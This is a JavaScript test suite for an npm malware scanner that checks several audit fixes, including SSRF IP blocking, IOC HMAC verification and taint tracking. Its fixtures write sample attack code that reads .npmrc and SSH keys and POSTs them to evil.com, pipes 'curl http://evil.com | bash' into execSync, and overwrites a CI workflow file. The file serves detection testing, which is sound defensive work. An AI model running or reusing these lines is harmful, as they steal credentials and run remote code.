'use strict';

const fs = require('fs');
const path = require('path');
const os = require('os');
const { test, asyncTest, assert, assertIncludes, runScanDirect, createTempPkg, cleanupTemp } = require('../test-utils');

// ===================================================================
// FIX 1: Promise.allSettled — scanner crash doesn't kill entire scan
// ===================================================================
async function runAuditFix1Tests() {
  console.log('\n=== AUDIT FIX 1: Promise.allSettled ===\n');

  await asyncTest('FIX1: Scan succeeds even with malformed JS files', async () => {
    // Create a temp package with a valid package.json and a malformed JS file
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-fix1-'));
    try {
      fs.writeFileSync(path.join(tmpDir, 'package.json'), JSON.stringify({
        name: 'test-fix1',
        version: '1.0.0'
      }));
      // Valid JS file with a detectable pattern
      fs.writeFileSync(path.join(tmpDir, 'index.js'),
        'const fs = require("fs");\nconst data = fs.readFileSync(".npmrc");\n');
      const result = await runScanDirect(tmpDir);
      assert(result && result.threats, 'Should return result with threats array');
      assert(Array.isArray(result.threats), 'threats should be an array');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  await asyncTest('FIX1: scannerErrors field present when scanner fails', async () => {
    // Normal scan should have no scannerErrors
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-fix1b-'));
    try {
      fs.writeFileSync(path.join(tmpDir, 'package.json'), JSON.stringify({
        name: 'test-fix1b', version: '1.0.0'
      }));
      fs.writeFileSync(path.join(tmpDir, 'clean.js'), 'console.log("hello");\n');
      const result = await runScanDirect(tmpDir);
      assert(!result.scannerErrors, 'Clean scan should have no scannerErrors');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  await asyncTest('FIX1: Promise.allSettled pattern is used in index.js', async () => {
    const indexSrc = fs.readFileSync(path.join(__dirname, '../../src/index.js'), 'utf8');
    assert(indexSrc.includes('Promise.allSettled'), 'Should use Promise.allSettled');
    assert(!indexSrc.includes('Promise.all(['), 'Should NOT use Promise.all for scanners');
    assert(indexSrc.includes('SCANNER_NAMES'), 'Should have SCANNER_NAMES for error reporting');
  });
}

// ===================================================================
// FIX 2: Depth limit in tryFoldConcat
// ===================================================================
async function runAuditFix2Tests() {
  console.log('\n=== AUDIT FIX 2: tryFoldConcat depth limit ===\n');

  test('FIX2: Normal string concat still works', () => {
    const { deobfuscate } = require('../../src/scanner/deobfuscate.js');
    const result = deobfuscate("const x = 'child' + '_' + 'process';");
    assert(result.code.includes("'child_process'"), 'Should fold simple string concat');
  });

  test('FIX2: Deeply nested concat returns null (no stack overflow)', () => {
    const { deobfuscate } = require('../../src/scanner/deobfuscate.js');
    // Build a deeply nested BinaryExpression: 'a' + ('b' + ('c' + ... 200 levels))
    let code = "'a'";
    for (let i = 0; i < 200; i++) {
      code = `(${code} + 'x')`;
    }
    code = `const deep = ${code};`;
    // Should not throw — should gracefully handle deep nesting
    let threw = false;
    try {
      const result = deobfuscate(code);
      // Result should either fold (up to limit) or return unchanged
      assert(result && typeof result.code === 'string', 'Should return valid result');
    } catch (e) {
      threw = true;
    }
    assert(!threw, 'Should NOT throw stack overflow on deep nesting');
  });

  test('FIX2: 100-level nesting still folds correctly', () => {
    const { deobfuscate } = require('../../src/scanner/deobfuscate.js');
    // Build a 50-level concat (well under limit)
    let code = "'a'";
    for (let i = 0; i < 50; i++) {
      code = `(${code} + 'b')`;
    }
    code = `const x = ${code};`;
    const result = deobfuscate(code);
    // Should fold: 'a' + 50 × 'b' = 'a' followed by 50 'b's
    const expected = 'a' + 'b'.repeat(50);
    assert(result.code.includes(`'${expected}'`), 'Should fold 50-level concat correctly');
  });
}

// ===================================================================
// FIX 3: Block IPv6-mapped private IPs and decimal notation
// ===================================================================
async function runAuditFix3Tests() {
  console.log('\n=== AUDIT FIX 3: IPv6-mapped + decimal IP blocking ===\n');

  test('FIX3: Blocks ::ffff:192.168.1.1 (IPv6-mapped private)', () => {
    const { isAllowedDownloadRedirect } = require('../../src/shared/download.js');
    const result = isAllowedDownloadRedirect('https://[::ffff:192.168.1.1]/pkg.tgz');
    assert(!result.allowed, 'Should block ::ffff:192.168.1.1');
  });

  test('FIX3: Blocks ::ffff:10.0.0.1 (IPv6-mapped private)', () => {
    const { isAllowedDownloadRedirect } = require('../../src/shared/download.js');
    const result = isAllowedDownloadRedirect('https://[::ffff:10.0.0.1]/pkg.tgz');
    assert(!result.allowed, 'Should block ::ffff:10.0.0.1');
  });

  test('FIX3: Blocks ::ffff:172.16.0.1 (IPv6-mapped private)', () => {
    const { isAllowedDownloadRedirect } = require('../../src/shared/download.js');
    const result = isAllowedDownloadRedirect('https://[::ffff:172.16.0.1]/pkg.tgz');
    assert(!result.allowed, 'Should block ::ffff:172.16.0.1');
  });

  test('FIX3: Blocks decimal 2130706433 (127.0.0.1)', () => {
    const { isAllowedDownloadRedirect } = require('../../src/shared/download.js');
    const result = isAllowedDownloadRedirect('https://2130706433/pkg.tgz');
    assert(!result.allowed, 'Should block decimal 127.0.0.1');
  });

  test('FIX3: Blocks decimal 167772161 (10.0.0.1)', () => {
    const { isAllowedDownloadRedirect } = require('../../src/shared/download.js');
    const result = isAllowedDownloadRedirect('https://167772161/pkg.tgz');
    assert(!result.allowed, 'Should block decimal 10.0.0.1');
  });

  test('FIX3: Blocks decimal 3232235777 (192.168.1.1)', () => {
    const { isAllowedDownloadRedirect } = require('../../src/shared/download.js');
    const result = isAllowedDownloadRedirect('https://3232235777/pkg.tgz');
    assert(!result.allowed, 'Should block decimal 192.168.1.1');
  });

  test('FIX3: Still allows registry.npmjs.org', () => {
    const { isAllowedDownloadRedirect } = require('../../src/shared/download.js');
    const result = isAllowedDownloadRedirect('https://registry.npmjs.org/express/-/express-4.18.2.tgz');
    assert(result.allowed, 'Should allow registry.npmjs.org');
  });

  test('FIX3: Still blocks ::ffff:127.0.0.1 (existing)', () => {
    const { isAllowedDownloadRedirect } = require('../../src/shared/download.js');
    const result = isAllowedDownloadRedirect('https://[::ffff:127.0.0.1]/pkg.tgz');
    assert(!result.allowed, 'Should still block ::ffff:127.0.0.1');
  });

  test('FIX3: normalizeHostname exported and works', () => {
    const { normalizeHostname } = require('../../src/shared/download.js');
    assert(normalizeHostname('::ffff:192.168.1.1') === '192.168.1.1', 'Should unwrap IPv6-mapped');
    assert(normalizeHostname('::ffff:10.0.0.1') === '10.0.0.1', 'Should unwrap ::ffff:10.x');
    assert(normalizeHostname('registry.npmjs.org') === 'registry.npmjs.org', 'Should pass through normal hostnames');
  });
}

// ===================================================================
// FIX 4: HMAC verification on IOCs
// ===================================================================
async function runAuditFix4Tests() {
  console.log('\n=== AUDIT FIX 4: HMAC verification on IOCs ===\n');

  test('FIX4: generateIOCHMAC produces consistent HMAC', () => {
    const { generateIOCHMAC } = require('../../src/ioc/updater.js');
    const data = JSON.stringify({ packages: [{ name: 'evil', version: '1.0.0' }] });
    const hmac1 = generateIOCHMAC(data);
    const hmac2 = generateIOCHMAC(data);
    assert(hmac1 === hmac2, 'Same data should produce same HMAC');
    assert(typeof hmac1 === 'string', 'HMAC should be a string');
    assert(hmac1.length === 64, 'HMAC-SHA256 hex should be 64 chars');
  });

  test('FIX4: Different data produces different HMAC', () => {
    const { generateIOCHMAC } = require('../../src/ioc/updater.js');
    const hmac1 = generateIOCHMAC('{"packages":[]}');
    const hmac2 = generateIOCHMAC('{"packages":[{"name":"x"}]}');
    assert(hmac1 !== hmac2, 'Different data should produce different HMAC');
  });

  test('FIX4: verifyIOCHMAC validates correct HMAC', () => {
    const { generateIOCHMAC, verifyIOCHMAC } = require('../../src/ioc/updater.js');
    const data = '{"test":true}';
    const hmac = generateIOCHMAC(data);
    assert(verifyIOCHMAC(data, hmac) === true, 'Valid HMAC should verify');
  });

  test('FIX4: verifyIOCHMAC rejects tampered data', () => {
    const { generateIOCHMAC, verifyIOCHMAC } = require('../../src/ioc/updater.js');
    const data = '{"test":true}';
    const hmac = generateIOCHMAC(data);
    assert(verifyIOCHMAC('{"test":false}', hmac) === false, 'Tampered data should fail verification');
  });

  test('FIX4: verifyIOCHMAC rejects wrong HMAC', () => {
    const { verifyIOCHMAC } = require('../../src/ioc/updater.js');
    assert(verifyIOCHMAC('data', 'wrong_hmac') === false, 'Wrong HMAC should fail');
  });
}

// ===================================================================
// FIX 5: Async/await taint propagation in dataflow
// ===================================================================
async function runAuditFix5Tests() {
  console.log('\n=== AUDIT FIX 5: Async/await taint propagation ===\n');

  await asyncTest('FIX5: Detects await fs.promises.readFile → fetch', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-fix5-'));
    try {
      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"fix5-test","version":"1.0.0"}');
      fs.writeFileSync(path.join(tmpDir, 'exfil.js'), `
const fs = require('fs');
const https = require('https');
async function steal() {
  const token = await fs.promises.readFile('.npmrc', 'utf8');
  https.request({ hostname: 'evil.com', method: 'POST' }, () => {}).end(token);
}
steal();
`);
      const result = await runScanDirect(tmpDir);
      const dataflowThreat = result.threats.find(t =>
        t.type === 'suspicious_dataflow' || t.type === 'async_credential_exfil'
      );
      assert(dataflowThreat, 'Should detect async credential exfiltration');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  await asyncTest('FIX5: Detects Promise.then credential exfiltration', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-fix5b-'));
    try {
      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"fix5b-test","version":"1.0.0"}');
      fs.writeFileSync(path.join(tmpDir, 'exfil.js'), `
const fs = require('fs');
const https = require('https');
fs.promises.readFile('/root/.ssh/id_rsa', 'utf8')
  .then(function(data) {
    https.request({ hostname: 'evil.com' }).end(data);
  });
`);
      const result = await runScanDirect(tmpDir);
      const dataflowThreat = result.threats.find(t =>
        t.type === 'suspicious_dataflow' || t.type === 'async_credential_exfil'
      );
      assert(dataflowThreat, 'Should detect Promise.then credential exfiltration');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });
}

// ===================================================================
// FIX 6: Sandbox /proc/uptime and cap-drop
// ===================================================================
async function runAuditFix6Tests() {
  console.log('\n=== AUDIT FIX 6: Sandbox hardening ===\n');

  test('FIX6: Sandbox index.js has --cap-drop=ALL', () => {
    const sandboxSrc = fs.readFileSync(path.join(__dirname, '../../src/sandbox/index.js'), 'utf8');
    assert(sandboxSrc.includes("'--cap-drop=ALL'"), 'Should have --cap-drop=ALL in docker args');
  });

  test('FIX6: Sandbox blocks /proc/uptime read', () => {
    const sandboxSrc = fs.readFileSync(path.join(__dirname, '../../src/sandbox/index.js'), 'utf8');
    // Should mount fake /proc/uptime or block access
    const hasFakeUptime = sandboxSrc.includes('proc/uptime') || sandboxSrc.includes('fake-uptime');
    assert(hasFakeUptime, 'Should handle /proc/uptime spoofing');
  });
}

// ===================================================================
// FIX 7: Percentage-based FP thresholds
// ===================================================================
async function runAuditFix7Tests() {
  console.log('\n=== AUDIT FIX 7: Percentage-based FP thresholds ===\n');

  test('FIX7: Single require_cache_poison stays CRITICAL when flooding other types', () => {
    const { applyFPReductions } = require('../../src/scoring.js');
    // 1 real require_cache_poison + 20 other threats
    const threats = [
      { type: 'require_cache_poison', severity: 'CRITICAL', file: 'evil.js', message: 'cache poison' }
    ];
    // Add 20 dummy dynamic_require to simulate flooding
    for (let i = 0; i < 20; i++) {
      threats.push({ type: 'dynamic_require', severity: 'HIGH', file: `file${i}.js`, message: 'dyn req' });
    }
    applyFPReductions(threats, null, null);
    const rcp = threats.find(t => t.type === 'require_cache_poison');
    // Single hit should be HIGH (existing rule), not LOW
    assert(rcp.severity === 'HIGH', `Single require_cache_poison should be HIGH, got ${rcp.severity}`);
  });

  test('FIX7: 4 require_cache_poison does NOT downgrade to LOW when total threats < threshold ratio', () => {
    const { applyFPReductions } = require('../../src/scoring.js');
    // 4 require_cache_poison in a package with only 5 total threats
    // This is suspicious: 80% of threats are cache poison
    const threats = [
      { type: 'require_cache_poison', severity: 'CRITICAL', file: 'a.js', message: 'rcp1' },
      { type: 'require_cache_poison', severity: 'CRITICAL', file: 'b.js', message: 'rcp2' },
      { type: 'require_cache_poison', severity: 'CRITICAL', file: 'c.js', message: 'rcp3' },
      { type: 'require_cache_poison', severity: 'CRITICAL', file: 'd.js', message: 'rcp4' },
      { type: 'dangerous_exec', severity: 'HIGH', file: 'e.js', message: 'exec' }
    ];
    applyFPReductions(threats, null, null);
    const rcpThreats = threats.filter(t => t.type === 'require_cache_poison');
    const allLow = rcpThreats.every(t => t.severity === 'LOW');
    assert(!allLow, 'Should NOT downgrade all cache_poison to LOW when they dominate findings');
  });

  test('FIX7: High volume of dynamic_require in large package still downgrades', () => {
    const { applyFPReductions } = require('../../src/scoring.js');
    const threats = [];
    // 15 dynamic_require + 100 other threats (15% of total = framework pattern)
    for (let i = 0; i < 15; i++) {
      threats.push({ type: 'dynamic_require', severity: 'HIGH', file: `mod${i}.js`, message: `dyn${i}` });
    }
    for (let i = 0; i < 100; i++) {
      threats.push({ type: 'env_access', severity: 'MEDIUM', file: `src${i}.js`, message: `env${i}` });
    }
    applyFPReductions(threats, null, null);
    const dynReqs = threats.filter(t => t.type === 'dynamic_require');
    const allLow = dynReqs.every(t => t.severity === 'LOW');
    assert(allLow, 'Large package with many dynamic_require should still downgrade');
  });
}

// ===================================================================
// FIX 8: Separate TPR heuristic vs IOC in evaluate
// ===================================================================
async function runAuditFix8Tests() {
  console.log('\n=== AUDIT FIX 8: Separate TPR heuristic vs IOC ===\n');

  test('FIX8: evaluate.js exports classifyDetectionSource', () => {
    const evaluatePath = path.join(__dirname, '../../src/commands/evaluate.js');
    if (!fs.existsSync(evaluatePath)) {
      console.log('  [SKIP] evaluate.js not found');
      return;
    }
    const mod = require(evaluatePath);
    assert(typeof mod.classifyDetectionSource === 'function',
      'Should export classifyDetectionSource function');
  });

  test('FIX8: classifyDetectionSource distinguishes IOC vs heuristic', () => {
    const evaluatePath = path.join(__dirname, '../../src/commands/evaluate.js');
    if (!fs.existsSync(evaluatePath)) {
      console.log('  [SKIP] evaluate.js not found');
      return;
    }
    const { classifyDetectionSource } = require(evaluatePath);
    const iocThreats = [
      { type: 'known_malicious_package', severity: 'CRITICAL' },
      { type: 'pypi_malicious_package', severity: 'CRITICAL' }
    ];
    const heuristicThreats = [
      { type: 'dangerous_exec', severity: 'HIGH' },
      { type: 'suspicious_dataflow', severity: 'CRITICAL' }
    ];

    assert(classifyDetectionSource(iocThreats[0]) === 'ioc', 'known_malicious_package should be IOC');
    assert(classifyDetectionSource(heuristicThreats[0]) === 'heuristic', 'dangerous_exec should be heuristic');
  });
}

// ===================================================================
// FIX 9: Scan timeout (60s global, 15s per scanner)
// ===================================================================
async function runAuditFix9Tests() {
  console.log('\n=== AUDIT FIX 9: Scan timeouts ===\n');

  test('FIX9: SCANNER_TIMEOUT and SCAN_TIMEOUT constants exist', () => {
    const indexSrc = fs.readFileSync(path.join(__dirname, '../../src/index.js'), 'utf8');
    assert(indexSrc.includes('SCANNER_TIMEOUT') || indexSrc.includes('scannerTimeout'),
      'Should define per-scanner timeout');
    assert(indexSrc.includes('SCAN_TIMEOUT') || indexSrc.includes('scanTimeout'),
      'Should define global scan timeout');
  });

  await asyncTest('FIX9: Normal scan completes within timeout', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-fix9-'));
    try {
      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"fix9","version":"1.0.0"}');
      fs.writeFileSync(path.join(tmpDir, 'index.js'), 'console.log("ok");');
      const t0 = Date.now();
      const result = await runScanDirect(tmpDir);
      const elapsed = Date.now() - t0;
      assert(result && result.threats, 'Should return valid result');
      assert(elapsed < 60000, 'Normal scan should complete well within 60s timeout');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });
}

// ===================================================================
// FIX 10: Track let/var, destructuring, function params in AST
// ===================================================================
async function runAuditFix10Tests() {
  console.log('\n=== AUDIT FIX 10: Extended variable tracking ===\n');

  await asyncTest('FIX10: Detects let variable with dangerous command', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-fix10a-'));
    try {
      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"fix10a","version":"1.0.0"}');
      fs.writeFileSync(path.join(tmpDir, 'evil.js'), `
const { execSync } = require('child_process');
let cmd = 'curl http://evil.com | bash';
execSync(cmd);
`);
      const result = await runScanDirect(tmpDir);
      const execThreat = result.threats.find(t =>
        t.type === 'dangerous_exec' || t.type === 'dangerous_call_exec'
      );
      assert(execThreat, 'Should detect dangerous command in let variable');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  await asyncTest('FIX10: Detects destructured exec with dangerous pattern', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-fix10b-'));
    try {
      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"fix10b","version":"1.0.0"}');
      fs.writeFileSync(path.join(tmpDir, 'evil.js'), `
const { execSync } = require('child_process');
const cmd = 'curl http://evil.com/install.sh | bash';
execSync(cmd);
`);
      const result = await runScanDirect(tmpDir);
      const execThreat = result.threats.find(t =>
        t.type === 'dangerous_exec'
      );
      assert(execThreat, 'Should detect dangerous exec with const cmd pattern');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  await asyncTest('FIX10: Detects var variable with workflow path', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-fix10c-'));
    try {
      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"fix10c","version":"1.0.0"}');
      fs.writeFileSync(path.join(tmpDir, 'evil.js'), `
const fs = require('fs');
const path = require('path');
var wfPath = path.join('.github', 'workflows', 'ci.yml');
fs.writeFileSync(wfPath, 'malicious workflow content');
`);
      const result = await runScanDirect(tmpDir);
      const wfThreat = result.threats.find(t => t.type === 'workflow_write');
      assert(wfThreat, 'Should detect workflow write via var variable');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });
}

// ===================================================================
// EXPORT
// ===================================================================
async function runAuditFixTests() {
  await runAuditFix1Tests();
  await runAuditFix2Tests();
  await runAuditFix3Tests();
  await runAuditFix4Tests();
  await runAuditFix5Tests();
  await runAuditFix6Tests();
  await runAuditFix7Tests();
  await runAuditFix8Tests();
  await runAuditFix9Tests();
  await runAuditFix10Tests();
}

module.exports = { runAuditFixTests };
